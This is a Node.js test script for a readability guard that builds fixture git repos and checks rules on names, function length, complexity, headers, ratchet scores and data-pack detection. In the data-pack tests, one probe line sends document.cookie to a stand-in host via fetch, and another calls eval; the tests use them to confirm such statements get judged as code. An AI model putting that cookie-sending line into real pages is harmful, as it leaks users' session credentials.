#!/usr/bin/env node
/**
 * e2e/readability-guard.cjs — EVERY §6 RULE, BROKEN ONCE ON A FIXTURE (READ-GUARD, 2026-10-15). Offline: no browser, no server, no install.
 *
 * tools/readability.cjs --changed judges only what a change touched. This builds a throw-away git repo (a base commit, then the
 * head edits), writes the ratchet from the base, and asserts what the guard says about each edit:
 *   · ct → counter passes · `const q =` fails · a NEW 90-line function fails · a legacy long function touched but not grown WARNS ·
 *     a legacy long function that grew FAILS · a function that CROSSED 80 lines fails · complexity > 15 fails · nesting > 4 fails ·
 *     a new empty catch (both forms) fails · a module with no header fails · a header with no CARD line fails ·
 *     a module with no test row in trace.json fails · missing §7 minimums WARN before 2026-10-22 and FAIL after ·
 *     a file whose score rose above its ratchet row fails · --write lowers a row and refuses to raise one · a docs-only change judges nothing
 *   · tools/graph/trace.cjs on the KG1 fixture gives the fixture's api route module a row with its test and its route
 *
 * Run: node e2e/readability-guard.cjs        (CI: web check job)
 */
'use strict';
const fs = require('fs'), path = require('path'), os = require('os');
const { spawnSync } = require('child_process');

const ROOT = path.join(__dirname, '..');
const TOOL = path.join(ROOT, 'tools/readability.cjs');
const TRACE_TOOL = path.join(ROOT, 'tools/graph/trace.cjs');
const GRAPH_TOOL = path.join(ROOT, 'tools/graph/graph.cjs');
const KG_FIXTURE = path.join(ROOT, 'tools/graph/fixture');
const MINIMUMS_FAIL_FROM = require(path.join(ROOT, 'tools/readability/guard.cjs')).MINIMUMS_FAIL_FROM;

let bad = 0;
const ok = (cond, what) => { if (cond) console.log('  ✓ ' + what); else { bad++; console.log('  ✗ ' + what); } };
const run = (args, cwd) => spawnSync(process.execPath, args, { encoding: 'utf8', cwd: cwd || ROOT, maxBuffer: 64 << 20 });
const git = (cwd, args) => { const r = spawnSync('git', ['-C', cwd].concat(args), { encoding: 'utf8' }); if (r.status !== 0) throw new Error('git ' + args.join(' ') + ': ' + r.stderr); return r.stdout.trim(); };

/* ── the fixture texts ─────────────────────────────────────────────────────────────────────────────────────────── */
const HEADER = (name) => `/* public/app/${name}.js — a fixture module.\n * OWNS      the ${name} numbers.\n * CALLED BY the test.\n * FLOW      read → paint.\n * CARD      qa/fixture-${name}\n */\n`;
const NO_CARD_HEADER = '/* a fixture module.\n * OWNS      nothing much.\n * CALLED BY the test.\n * FLOW      read → paint.\n */\n';
/** a function of exactly `lines` lines (header line + body + closing brace), complexity 1 */
function longFunction(name, lines) {
  const body = []; for (let i = 0; i < lines - 2; i++) body.push('  total += ' + (i + 1) + ';');
  return `// ${name}: adds up a fixed list (fixture)\nfunction ${name}(total) {\n${body.join('\n')}\n  return total;\n}\n`;
}
function complexFunction(name, branches) {
  const body = []; for (let i = 0; i < branches; i++) body.push(`  if (value === ${i + 11}) total += 1;`);
  return `// ${name}: one branch per value (fixture)\nfunction ${name}(value, total) {\n${body.join('\n')}\n  return total;\n}\n`;
}
const NESTED = `// deepOne: five levels of nesting (fixture)\nfunction deepOne(rows) {\n  let total = 0;\n  for (const row of rows) {\n    if (row) {\n      for (const cell of row) {\n        if (cell) {\n          while (total < 100) { total += cell; }\n        }\n      }\n    }\n  }\n  return total;\n}\n`;

/* a name is judged by the function around it (DECISIONS 2026-11-12, Google JS 6.1): the cryptic fixtures sit in a 13-line function so the scope test lets nothing off */
const PAD = '  rows.length;\n'.repeat(10);

const BASE = {
  'public/app/rename.js': HEADER('rename') + 'function paintTotals(rows) {\n  var ct = rows.length;\n' + PAD + '  return ct;\n}\n',
  'public/app/cryptic.js': HEADER('cryptic') + 'function countRows(rows) {\n  return rows.length;\n}\n',
  'public/app/long.js': HEADER('long') + longFunction('legacyStays', 85) + longFunction('legacyGrows', 85) + longFunction('crossesLimit', 79) + 'function shortOne(total) {\n  return total + 1;\n}\n',
  'public/app/complex.js': HEADER('complex') + 'function plainOne(total) {\n  return total;\n}\n',
  'public/app/nested.js': HEADER('nested') + 'function flatOne(total) {\n  return total;\n}\n',
  'public/app/catch.js': HEADER('catch') + 'function readSafely(reader) {\n  return reader();\n}\n',
  'public/app/header.js': HEADER('header') + 'function paintHeader(rows) {\n  return rows.length;\n}\n',
  'public/app/nocard.js': HEADER('nocard') + 'function paintNoCard(rows) {\n  return rows.length;\n}\n',
  'public/app/untouched.js': HEADER('untouched') + 'function neverTouched(rows) {\n  var q = rows.length;\n' + PAD + '  return q;\n}\n',
  'public/app/notest.js': HEADER('notest') + 'function paintNoTest(rows) {\n  return rows.length;\n}\n',
  'public/app/minimums.js': HEADER('minimums') + 'function paintMinimums(rows) {\n  return rows.length;\n}\n',
  'public/app/worse.js': HEADER('worse') + 'function paintWorse(rows) {\n  return rows.length;\n}\n',
  'public/app/better.js': HEADER('better') + longFunction('getsShorter', 45),
  'public/app/partial.js': HEADER('partial') + longFunction('stillLongA', 45) + longFunction('stillLongB', 45),
  'public/app/stuck.js': HEADER('stuck') + longFunction('stuckLong', 45),
  'docs/notes.md': '# notes\n'
};
const HEAD = {
  'public/app/rename.js': HEADER('rename') + 'function paintTotals(rows) {\n  var counter = rows.length;\n' + PAD + '  return counter;\n}\n',
  'public/app/cryptic.js': HEADER('cryptic') + 'function countRows(rows) {\n  const q = rows.length;\n' + PAD + '  return q;\n}\n',
  'public/app/long.js': HEADER('long') + longFunction('legacyStays', 85).replace('total += 3;', 'total += 30;') + longFunction('legacyGrows', 86) + longFunction('crossesLimit', 81) + longFunction('freshLong', 90) + 'function shortOne(total) {\n  return total + 1;\n}\n',
  'public/app/complex.js': HEADER('complex') + 'function plainOne(total) {\n  return total;\n}\n' + complexFunction('branchy', 16),
  'public/app/nested.js': HEADER('nested') + 'function flatOne(total) {\n  return total;\n}\n' + NESTED,
  'public/app/catch.js': HEADER('catch') + 'function readSafely(reader) {\n  try { return reader(); } catch (_) {}\n}\nfunction readLater(promise) {\n  return promise.catch(function () {});\n}\n',
  'public/app/header.js': 'function paintHeader(rows) {\n  return rows.length + 1;\n}\n',
  'public/app/nocard.js': NO_CARD_HEADER + 'function paintNoCard(rows) {\n  return rows.length + 1;\n}\n',
  'public/app/untouched.js': BASE['public/app/untouched.js'],
  'public/app/notest.js': HEADER('notest') + 'function paintNoTest(rows) {\n  return rows.length + 1;\n}\n',
  'public/app/minimums.js': HEADER('minimums') + 'function paintMinimums(rows) {\n  return rows.length + 1;\n}\n',
  'public/app/worse.js': HEADER('worse') + 'function paintWorse(rows) {\n  return rows.length;\n}\n' + longFunction('nowLong', 45),
  'public/app/better.js': HEADER('better') + longFunction('getsShorter', 20),
  'public/app/partial.js': HEADER('partial') + longFunction('stillLongA', 45) + longFunction('stillLongB', 20),
  'public/app/stuck.js': HEADER('stuck') + longFunction('stuckLong', 45).replace('total += 3;', 'total += 30;'),
  'docs/notes.md': '# notes\n\nmore words\n'
};
const TRACE = { generated: '2026-10-15', repo: 'web', modules: {} };
for (const file of Object.keys(BASE)) if (/^public\//.test(file)) TRACE.modules[file] = { card: 'qa/fixture', layer: 'ui', tests: [{ file: 'e2e/fixture.cjs', via: ['reads'], steps: [] }], walks: [], minimums: { layer: 'ui', have: ['walk'], missing: [] } };
TRACE.modules['public/app/notest.js'].tests = [];
TRACE.modules['public/app/minimums.js'].minimums = { layer: 'ui', have: ['walk'], missing: ['aa-contrast', 'cream-and-dark-1366-390'] };

/* ── build the throw-away repo ─────────────────────────────────────────────────────────────────────────────────── */
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'cb-readability-'));
const writeAll = (files) => { for (const [file, text] of Object.entries(files)) { fs.mkdirSync(path.join(tmp, path.dirname(file)), { recursive: true }); fs.writeFileSync(path.join(tmp, file), text); } };
writeAll(BASE);
git(tmp, ['init', '-q']); git(tmp, ['config', 'user.email', 'fixture@example']); git(tmp, ['config', 'user.name', 'fixture']);
git(tmp, ['add', '-A']); git(tmp, ['commit', '-q', '-m', 'base']);
const baseSha = git(tmp, ['rev-parse', 'HEAD']);

console.log('\n1 · the ratchet is written from the base (lower only)');
const wrote = run([TOOL, '--repo', 'web', '--root', tmp, '--write']);
ok(wrote.status === 0 && fs.existsSync(path.join(tmp, 'readability.ratchet.json')), 'readability --write writes readability.ratchet.json' + (wrote.status ? '\n' + wrote.stdout + wrote.stderr : ''));
const ratchet0 = JSON.parse(fs.readFileSync(path.join(tmp, 'readability.ratchet.json'), 'utf8'));
ok(ratchet0['public/app/worse.js'] && ratchet0['public/app/worse.js'].score === 0, 'worse.js starts at score 0 (' + JSON.stringify(ratchet0['public/app/worse.js']) + ')');
ok(ratchet0['public/app/better.js'] && ratchet0['public/app/better.js'].long40 === 1, 'better.js starts with one function over 40 lines');
ok(!ratchet0['docs/notes.md'], 'a doc has no ratchet row');

/* the engines repo has no tool of its own: --repo engines writes its ratchet from here (src/ and tools/ are its own code) */
const engTmp = fs.mkdtempSync(path.join(os.tmpdir(), 'cb-readability-eng-'));
fs.mkdirSync(path.join(engTmp, 'src'));
fs.writeFileSync(path.join(engTmp, 'src/rule.js'), '// OWNS  a fixture rule.\nmodule.exports = (a) => a;\n');
const wroteEng = run([TOOL, '--repo', 'engines', '--root', engTmp, '--write']);
const engRows = fs.existsSync(path.join(engTmp, 'readability.ratchet.json')) ? JSON.parse(fs.readFileSync(path.join(engTmp, 'readability.ratchet.json'), 'utf8')) : {};
ok(wroteEng.status === 0 && engRows['src/rule.js'] && typeof engRows['src/rule.js'].score === 'number', '--repo engines --write writes the engines ratchet, one row per own-code file' + (wroteEng.status ? '\n' + wroteEng.stdout + wroteEng.stderr : ''));
const wroteEng2 = run([TOOL, '--repo', 'engines', '--root', engTmp, '--write']);
ok(wroteEng2.status === 0 && /0 lowered · 0 refused/.test(wroteEng2.stdout), '--repo engines --write again changes nothing (lower only)');

console.log('\n2 · the head edits, judged against the base');
writeAll(HEAD);
fs.writeFileSync(path.join(tmp, 'trace.json'), JSON.stringify(TRACE));
const out = path.join(tmp, 'result.json');
const judged = run([TOOL, '--changed', '--repo', 'web', '--root', tmp, '--base', baseSha, '--ratchet', '--md', '--today', '2026-10-16', '--json', out]);
ok(judged.status === 1, 'the guard exits 1 on the broken fixture' + (judged.status === 1 ? '' : '\n' + judged.stdout + judged.stderr));
const result = JSON.parse(fs.readFileSync(out, 'utf8'));
const findings = (rule, file) => result.findings.filter((finding) => finding.rule === rule && finding.text.includes(file));
const fails = (rule, file) => findings(rule, file).filter((finding) => finding.level === 'fail');
const warns = (rule, file) => findings(rule, file).filter((finding) => finding.level === 'warn');
const noFindings = (file) => result.findings.filter((finding) => finding.text.includes(file) && finding.level === 'fail').length === 0;

ok(noFindings('rename.js'), 'ct → counter passes (rename.js: no failure)');
ok(fails('cryptic-name', 'cryptic.js').length === 1 && /`q`/.test(fails('cryptic-name', 'cryptic.js')[0].text), '`const q =` fails as a new cryptic name');
ok(fails('hard-limit', 'freshLong').length === 1, 'a NEW 90-line function fails the hard limit');
ok(warns('hard-limit', 'legacyStays').length === 1 && fails('hard-limit', 'legacyStays').length === 0, 'a legacy long function touched but not grown only WARNS');
ok(fails('hard-limit', 'legacyGrows').length === 1 && /WORSE/.test(fails('hard-limit', 'legacyGrows')[0].text), 'a legacy long function that grew by one line FAILS');
ok(fails('hard-limit', 'crossesLimit').length === 1 && /crossed/.test(fails('hard-limit', 'crossesLimit')[0].text), 'a function that crossed 80 lines FAILS');
ok(fails('hard-limit', 'branchy').length === 1 && /c1[6-9]|c2\d/.test(fails('hard-limit', 'branchy')[0].text), 'complexity over 15 fails');
ok(fails('hard-limit', 'deepOne').length === 1 && /depth5/.test(fails('hard-limit', 'deepOne')[0].text), 'nesting over 4 fails');
ok(fails('empty-catch', 'catch.js').length === 1 && /0 → 2/.test(fails('empty-catch', 'catch.js')[0].text) && /catch \{\}/.test(fails('empty-catch', 'catch.js')[0].text) && /\.catch\(fn\)/.test(fails('empty-catch', 'catch.js')[0].text), 'a new `catch (_) {}` and a new `.catch(function () {})` both fail');
ok(fails('module-header', 'header.js').length === 1 && /no header comment at all/.test(fails('module-header', 'header.js')[0].text), 'a touched module with no header fails');
ok(fails('card-line', 'nocard.js').length === 1 && fails('module-header', 'nocard.js').length === 0, 'a header without a CARD line fails the CARD rule only');
ok(result.findings.every((finding) => !finding.text.includes('untouched.js')), 'an untouched file is not judged (its `q` stays)');
ok(fails('trace-row', 'notest.js').length === 1, 'a module with no test row in trace.json fails');
ok(warns('test-minimums', 'minimums.js').length === 1 && /aa-contrast/.test(warns('test-minimums', 'minimums.js')[0].text), 'missing §7 minimums WARN before ' + MINIMUMS_FAIL_FROM);
ok(fails('ratchet', 'worse.js').length === 1 && /long40 0 → 1/.test(fails('ratchet', 'worse.js')[0].text), 'a file whose score rose above its ratchet row fails, naming the counter');
ok(result.findings.some((finding) => finding.rule === 'ratchet' && finding.level === 'info' && finding.text.includes('better.js')), 'a file whose score dropped is told to tighten the ratchet');
ok(!result.files.some((file) => file.file === 'docs/notes.md'), 'a doc is not an own-code file');
ok(/Pass 1 · shrink: lines \d+ → \d+ · complexity \d+ → \d+/.test(result.markdown) && /Pass 2 · humanify: cryptic names \d+ → \d+/.test(result.markdown) && /- \[ \] Guard green/.test(result.markdown), 'the --md checklist carries before → after numbers and an unticked Guard green');
ok(/\[cryptic-name\]/.test(judged.stdout) && /§6 checklist/.test(judged.stdout), 'the report and the checklist are printed');

console.log('\n3 · minimums fail after the first week; --write tightens only downward');
const late = run([TOOL, '--changed', '--repo', 'web', '--root', tmp, '--base', baseSha, '--today', '2026-10-30', '--json', out]);
const lateResult = JSON.parse(fs.readFileSync(out, 'utf8'));
ok(late.status === 1 && lateResult.findings.some((finding) => finding.rule === 'test-minimums' && finding.level === 'fail' && finding.text.includes('minimums.js')), 'missing §7 minimums FAIL on ' + '2026-10-30');
const tightened = run([TOOL, '--changed', '--repo', 'web', '--root', tmp, '--base', baseSha, '--ratchet', '--write', '--today', '2026-10-16']);
const ratchet1 = JSON.parse(fs.readFileSync(path.join(tmp, 'readability.ratchet.json'), 'utf8'));
ok(ratchet1['public/app/better.js'].score < ratchet0['public/app/better.js'].score, '--write lowered better.js (' + ratchet0['public/app/better.js'].score + ' → ' + ratchet1['public/app/better.js'].score + ')');
ok(ratchet1['public/app/worse.js'].score === 0 && /refused public\/app\/worse\.js/.test(tightened.stdout), '--write refused to raise worse.js (lower only)');

console.log('\n3b · the touch rule (MNT-30): warn mode today, fail with --strict or from the switch date');
const touchOf = (file, level) => result.findings.filter((finding) => finding.rule === 'touch' && finding.text.includes(file) && finding.level === level);
const touchRule = require(path.join(ROOT, 'tools/readability/touch.cjs'));
ok(touchOf('partial.js', 'warn').length === 1 && /better but not at 0/.test(touchOf('partial.js', 'warn')[0].text), 'a touched file that got better but is not at 0 WARNS (partial.js)');
ok(touchOf('stuck.js', 'warn').length === 1 && /not better/.test(touchOf('stuck.js', 'warn')[0].text), 'a touched file that is not better WARNS (stuck.js)');
ok(touchOf('better.js', 'warn').length === 0 && touchOf('rename.js', 'warn').length === 0, 'a touched file at 0 raises no touch finding');
ok(!result.findings.some((finding) => finding.rule === 'touch' && finding.level === 'fail'), 'warn mode turns nothing red on its own');
ok(/Touch rule \(report, warn mode until \d{4}-\d\d-\d\d\): touched files at 0 failures \d+\/\d+/.test(result.markdown), 'the --md checklist carries the Touch rule line');
run([TOOL, '--changed', '--repo', 'web', '--root', tmp, '--base', baseSha, '--ratchet', '--strict', '--today', '2026-10-16', '--json', out]);
const strictResult = JSON.parse(fs.readFileSync(out, 'utf8'));
ok(['partial.js', 'stuck.js'].every((file) => strictResult.findings.some((finding) => finding.rule === 'touch' && finding.level === 'fail' && finding.text.includes(file))), '--strict makes the touch rule FAIL both files');
run([TOOL, '--changed', '--repo', 'web', '--root', tmp, '--base', baseSha, '--ratchet', '--today', touchRule.FAIL_FROM, '--json', out]);
ok(JSON.parse(fs.readFileSync(out, 'utf8')).findings.some((finding) => finding.rule === 'touch' && finding.level === 'fail'), 'from ' + touchRule.FAIL_FROM + ' the touch rule fails without a flag');
ok(touchRule.verdictOf({ score: 3 }, { score: 0 }) === 'zero' && touchRule.verdictOf({ score: 3 }, { score: 2 }) === 'better' && touchRule.verdictOf({ score: 3 }, { score: 3 }) === 'same' && touchRule.verdictOf({ score: 2 }, { score: 3 }) === 'worse' && touchRule.verdictOf(null, { score: 1 }) === 'same', 'verdictOf: zero, better, same, worse, a new file not at 0');
ok(touchRule.modeFor('2026-11-06') === 'warn' && touchRule.modeFor(touchRule.FAIL_FROM) === 'fail' && touchRule.modeFor('2026-11-06', 'fail') === 'fail', 'modeFor: warn before the date, fail from it, an explicit option wins');

console.log('\n4 · a docs-only change judges nothing and passes');
git(tmp, ['add', '-A']); git(tmp, ['commit', '-q', '-m', 'head']);
fs.writeFileSync(path.join(tmp, 'docs/notes.md'), '# notes\n\nonly docs now\n');
const docsOnly = run([TOOL, '--changed', '--repo', 'web', '--root', tmp, '--base', 'HEAD', '--ratchet']);
ok(docsOnly.status === 0 && /0 own-code file/.test(docsOnly.stdout), 'docs-only: 0 own-code files, exit 0');

console.log('\n5 · trace.json from KG1 on the graph fixture (tools/graph/trace.cjs over tools/graph/graph.cjs)');
const traceOut = fs.mkdtempSync(path.join(os.tmpdir(), 'cb-trace-'));
const built = spawnSync(process.execPath, [GRAPH_TOOL, 'build', '--roots', 'web=' + path.join(KG_FIXTURE, 'web') + ',api=' + path.join(KG_FIXTURE, 'api') + ',engines=' + path.join(KG_FIXTURE, 'engines'), '--out', traceOut], { encoding: 'utf8' });
ok(built.status === 0, 'the graph builds on the fixture');
const traced = spawnSync(process.execPath, [TRACE_TOOL, '--repo', 'api', '--no-build', '--stdout', '--out', traceOut], { encoding: 'utf8', env: Object.assign({}, process.env, { CB_GRAPH_ROOTS: 'web=' + path.join(KG_FIXTURE, 'web') + ',api=' + path.join(KG_FIXTURE, 'api') + ',engines=' + path.join(KG_FIXTURE, 'engines') }), cwd: ROOT, maxBuffer: 64 << 20 });
let trace = null;
try { trace = JSON.parse(traced.stdout); } catch (error) { console.log('    trace.cjs gave no JSON: ' + (traced.stderr || '').slice(-300)); }
ok(trace && trace.repo === 'api' && trace.modules['routes/books.js'], 'the fixture api has a row for routes/books.js' + (trace ? '' : '\n' + traced.stdout.slice(0, 300)));
const booksRow = trace && trace.modules['routes/books.js'];
ok(booksRow && booksRow.layer === 'route' && booksRow.tests.some((test) => test.file === 'tests/pay.test.cjs'), 'its layer is route and tests/pay.test.cjs reaches it');
ok(booksRow && booksRow.routesServed.some((route) => /POST \/api\/books\/payments/.test(route)), 'it serves POST /api/books/payments');
ok(booksRow && Array.isArray(booksRow.minimums.missing) && booksRow.minimums.have.includes('one-success-path'), 'its §7 minimums are evidenced from its tests (one-success-path present)');
const libRow = trace && trace.modules['lib/pay.js'];
ok(libRow && libRow.layer === 'lib' && libRow.calledBy.some((file) => /routes\/books\.js/.test(file)), 'lib/pay.js is called by routes/books.js');
/* MNT-49 part 2: a run that cannot finish is stopped and says so; the guard asks for ONE repo */
const stopped = spawnSync(process.execPath, [TRACE_TOOL, '--repo', 'api', '--no-build', '--stdout', '--max-seconds', '0.001'], { encoding: 'utf8' });
ok(stopped.status === 124 && /stopped after 0\.001s \(--max-seconds\)/.test(stopped.stderr), 'trace.cjs past its --max-seconds is stopped: exit 124 and a sentence saying why');
const bareFlag = spawnSync(process.execPath, [TRACE_TOOL, '--repo', 'api', '--no-build', '--stdout', '--max-seconds'], { encoding: 'utf8', timeout: 60000, env: Object.assign({}, process.env, { CB_GRAPH_ROOTS: 'web=' + path.join(KG_FIXTURE, 'web') + ',api=' + path.join(KG_FIXTURE, 'api') + ',engines=' + path.join(KG_FIXTURE, 'engines') }) });
ok(bareFlag.status !== 124, 'a bare --max-seconds means the default, not one second');
ok(/\[TRACE_TOOL, '--repo', repo,/.test(fs.readFileSync(path.join(ROOT, 'tools/readability.cjs'), 'utf8')), 'the readability guard builds a missing trace for ONE repo (--repo), never the three-repo default');

console.log('\n5b · a comment-only or data-cbsid-only diff WARNS on the test-layer rules (module debt); a one-character code change still FAILS');
const noiseTmp = fs.mkdtempSync(path.join(os.tmpdir(), 'cb-readability-noise-'));
const noiseWrite = (files) => { for (const [file, text] of Object.entries(files)) { fs.mkdirSync(path.join(noiseTmp, path.dirname(file)), { recursive: true }); fs.writeFileSync(path.join(noiseTmp, file), text); } };
const FN = 'function paintRows(rows) {\n  return rows.length;\n}\n';
const PAGE = (extra, attr) => '<!doctype html>\n' + extra + '<html><body>\n<button id="go"' + attr + '>Go</button>\n<script>\n' + FN + '</script>\n</body></html>\n';
const NOISE_BASE = { 'public/app/note.js': HEADER('note') + FN, 'public/app/edit.js': HEADER('edit') + FN, 'public/app/ids.js': HEADER('ids') + "var tag = '<b>' + FN_NAME;\n".replace('FN_NAME', "'x'") + FN, 'public/page.html': PAGE('', '') };
noiseWrite(NOISE_BASE);
git(noiseTmp, ['init', '-q']); git(noiseTmp, ['config', 'user.email', 'fixture@example']); git(noiseTmp, ['config', 'user.name', 'fixture']);
git(noiseTmp, ['add', '-A']); git(noiseTmp, ['commit', '-q', '-m', 'base']);
const noiseBase = git(noiseTmp, ['rev-parse', 'HEAD']);
noiseWrite({
  'public/app/note.js': '/* OWNS a header added later. CALLED BY the test. */\n' + NOISE_BASE['public/app/note.js'].replace('return', '// count them\n  return'),
  'public/app/edit.js': NOISE_BASE['public/app/edit.js'].replace('rows.length', 'rows.length + 1'),
  'public/app/ids.js': NOISE_BASE['public/app/ids.js'].replace("'<b>'", "'<b data-cbsid=\"UX900\">'"),
  'public/page.html': PAGE('<!-- OWNS the page. CALLED BY nobody. -->\n', ' data-cbsid="BTN01"')
});
const noiseTrace = { generated: '2026-10-30', repo: 'web', modules: {} };
for (const file of Object.keys(NOISE_BASE)) noiseTrace.modules[file] = { card: 'qa/fixture', layer: 'ui', tests: [{ file: 'e2e/fixture.cjs', via: [], steps: [] }], walks: [], minimums: { layer: 'ui', have: [], missing: ['aa-contrast'] } };
fs.writeFileSync(path.join(noiseTmp, 'trace.json'), JSON.stringify(noiseTrace));
const noiseOut = path.join(noiseTmp, 'result.json');
run([TOOL, '--changed', '--repo', 'web', '--root', noiseTmp, '--base', noiseBase, '--today', '2026-10-30', '--json', noiseOut]);
const noiseFindings = JSON.parse(fs.readFileSync(noiseOut, 'utf8')).findings.filter((finding) => finding.rule === 'test-minimums');
const minimumsOf = (file) => noiseFindings.filter((finding) => finding.text.includes(file)).map((finding) => finding.level);
ok(minimumsOf('note.js').join() === 'warn' && /MODULE DEBT/.test(noiseFindings.find((finding) => finding.text.includes('note.js')).text), 'comment-only diff (a header and a line comment): test-minimums WARNS, listed as module debt, not failed');
ok(minimumsOf('ids.js').join() === 'warn', 'data-cbsid-only diff in a JS string: test-minimums WARNS');
ok(minimumsOf('page.html').join() === 'warn', 'html comment + data-cbsid attribute only: test-minimums WARNS');
ok(minimumsOf('edit.js').join() === 'fail', 'a one-character code change (+ 1): test-minimums still FAILS');
const noiseMod = require('../tools/readability/noise.cjs');
ok(noiseMod.sameCode('x.js', 'a(1); // x', 'a(1);') && !noiseMod.sameCode('x.js', 'a(1);', 'a(2);') && !noiseMod.sameCode('x.js', 'a(1', 'a(1);'), 'noise: comment removed is the same code; a changed literal or an unparsable file is not');
ok(!noiseMod.sameCode('x.js', 'function f(x) {\n  return\n  x;\n}', 'function f(x) {\n  return x;\n}') && !noiseMod.sameCode('x.js', 'a\n(b)', 'a(b)') && !noiseMod.sameCode('x.js', 'var a = 1\n+b', 'var a = 1 + b'), 'noise: a line break moved around return / ASI cases is a real change');
ok(noiseMod.sameCode('x.js', '// head\nvar a = 1;\n// why\nb();', 'var a = 1;\nb();') && noiseMod.sameCode('x.js', 'a();\n  // note\nb();', 'a();\nb();'), 'noise: comment lines added between statements that already sit on separate lines stay noise');
ok(!noiseMod.sameCode('x.html','<p>a</p><script>b()</script>', '<p>a</p><script>c()</script>') && !noiseMod.sameCode('x.html', '<p>a</p>', '<p>b</p>'), 'noise: a changed script or changed markup is not noise');
const POP = "{ pop: 'POP012' }", same = (head, base) => noiseMod.sameCode('x.js', head, base);
ok(same('modal(h, false, ' + POP + ');', 'modal(h);') && same('modal(h, false, ' + POP + ');', 'modal(h, false);') && same('modal(h, true, ' + POP + ');', 'modal(h, true);') && same('modal(f(a, b), w, ' + POP + ');', 'modal(f(a, b), w);'), 'noise: a dialog code as the extra last argument of modal() (the wide slot kept or a literal false added) is identity only, like data-cbsid');
ok(!same('modal(h, w, false);', 'modal(h, w);') && !same('modal(h, false, x);', 'modal(h, x);'), 'noise hostile: a false in the OPT slot (third argument, no stamp cut) is a real change');
ok(!same('modal(h, ' + POP + ');', 'modal(h);') && !same('modal(h, ' + POP + ', true);', 'modal(h, true);'), 'noise hostile: the pop object in the WIDE slot is truthy and makes the dialog wide, so it is a real change');
ok(!same('modal(h, w, { pop: \'later\' });', 'modal(h, w);') && !same('modal(h, w, { pop: \'POP1\', x: 1 });', 'modal(h, w);') && !same('modal(h, w, ' + POP + ', 1);', 'modal(h, w);') && !same('go(h, false, ' + POP + ');', 'go(h);'), 'noise hostile: a pop value that is no POP code, a second property, a fourth argument or another callee is a real change');
ok(!same('modal(h, true, ' + POP + ');', 'modal(h, false);'), 'noise hostile: a stamp cannot hide a wide flag that changed from false to true');
const popAt = (head, base) => noiseMod.sameCode('x.html', head, base);
ok(popAt('<div id="a" data-pop="POP206"></div>', '<div id="a"></div>') && same("a('<div id=\"p\" data-pop=\"POP206\" x=\"1\">');", "a('<div id=\"p\" x=\"1\">');"), 'noise: data-pop on an element that is not a .mhd head is a label (shortcuts.js reads only .mhd[data-pop])');
ok(!popAt('<div class="mhd" data-pop="POP206"></div>', '<div class="mhd"></div>') && !popAt('<div data-pop="POP206" class="mhd"></div>', '<div class="mhd"></div>') && !same("a('<div class=\"mhd\" data-pop=\"POP206\">');", "a('<div class=\"mhd\">');") && !popAt('<div data-pop="later"></div>', '<div></div>'), 'noise hostile: data-pop on a .mhd head (a shortcut reads it), in either attribute order, in a JS string, or with a value that is no POP code is a real change');
fs.rmSync(noiseTmp, { recursive: true, force: true });

console.log('\n6 · the modules behind the tool, one unit each');
const measure = require('../tools/readability/measure.cjs');
const facts = measure.factsFromText('public/app/unit.js', HEADER('unit') + 'function readShop(shop) {\n  var q = shop.id;\n' + PAD + '  try { return q; } catch (_) {}\n}\n' + complexFunction('manyBranches', 4));
ok(facts.functions.length === 2 && facts.functions[0].name === 'readShop' && facts.functions[1].complexity === 5, 'measure: two functions, manyBranches has complexity 5 (' + facts.functions.map((fn) => fn.name + ' c' + fn.complexity).join(', ') + ')');
ok(facts.cryptic.length === 1 && facts.cryptic[0].name === 'q' && facts.emptyCatches.length === 1 && facts.header.card === 'qa/fixture-unit', 'measure: one cryptic name, one empty catch, the CARD line read');
ok(measure.inScope('web', 'public/app/x.js') && !measure.inScope('web', 'public/till.html') && !measure.inScope('web', 'e2e/x.cjs') && !measure.inScope('api', 'lib/money.js', '/* ADOPTED from chitbridge-engines v1 · money */'), 'measure: scope — own code in, the vendored till / a test / an adopted copy out');
/* data packs: a pure translation pack is DATA (not judged); the same file with a helper function is code (judged) */
const PACK_HEAD = "(function () {\n  if (typeof CBSTR === 'undefined') return;\n  var fr = CBSTR.fr || (CBSTR.fr = {});\n  var pack = { 'Save': 'Enregistrer', 'Cancel': 'Annuler' };\n";
const PACK_TAIL = "  for (var k in pack) if (Object.prototype.hasOwnProperty.call(pack, k)) fr[k] = pack[k];\n  try {\n    if (typeof renderApp === 'function') renderApp();\n  } catch (_) {}\n";
const packWith = (extra) => PACK_HEAD + extra + PACK_TAIL + '})();\n';
const PACK_OK = packWith('') + packWith('');
/* the critic's probes: a statement that is not one of the four pack shapes makes the file code, wherever it sits in the wrapper */
const PROBES = { fetch: "fetch('https://x/y?' + document.cookie);\n", eval: 'eval(pack.Save);\n', if: "if (location.host) { pack.Save = 'x'; }\n" };
for (const name of Object.keys(PROBES)) ok(!measure.isDataPack('public/app/strings-fr.js', packWith(PROBES[name])) && measure.inScope('web', 'public/app/strings-fr.js', packWith(PROBES[name])), 'data pack: a ' + name + ' statement inside the wrapper makes the file code, judged');
ok(!measure.isDataPack('public/app/strings-fr.js', PACK_OK + "fetch('https://x/y');\n"), 'data pack: a loose statement outside any wrapper makes the file code, judged');
const PACK_FN = "(function () {\n  var pack = { 'Save': 'Enregistrer' };\n  function shout(text) { return text.toUpperCase(); }\n  pack.Save = shout(pack.Save);\n})();\n";
const PACK_VALUE = "(function () {\n  var pack = { 'Save': 'Enregistrer', 'Count': 3 };\n})();\n";
ok(measure.isDataPack('public/app/strings-fr.js', PACK_OK) && !measure.inScope('web', 'public/app/strings-fr.js', PACK_OK), 'data pack: a pure string pack (two wrappers, string → string pairs) is not judged');
ok(!measure.isDataPack('public/app/strings-fr.js', PACK_FN) && measure.inScope('web', 'public/app/strings-fr.js', PACK_FN), 'data pack: a pack file holding a helper function is still judged');
ok(!measure.isDataPack('public/app/strings-fr.js', PACK_VALUE) && measure.inScope('web', 'public/app/strings-fr.js', PACK_VALUE), 'data pack: a non-string value in the pack makes it code, judged');
ok(measure.inScope('web', 'public/app/locale.js', PACK_OK), 'data pack: only the strings-<lang>.js name is exempt — the same text under another name is judged');
/* INT7b: a route handler pairs with its own route when the file grows above it; a function with no route pairs as before */
const ROUTES = (pad) => "/* api fixture */\nconst router = {};\n" + pad + "router.get('/a', async (req, res) => {\n  return 1;\n});\n" +
  "router.post('/b', auth, async (req, res) => {\n  if (req.x) return 2;\n  if (req.y) return 3;\n  return 4;\n});\nfunction helper(rows) {\n  return rows;\n}\n";
const routeBase = measure.factsFromText('routes/fixture.js', ROUTES('')).functions;
const routeHead = measure.factsFromText('routes/fixture.js', ROUTES('\n'.repeat(9))).functions;
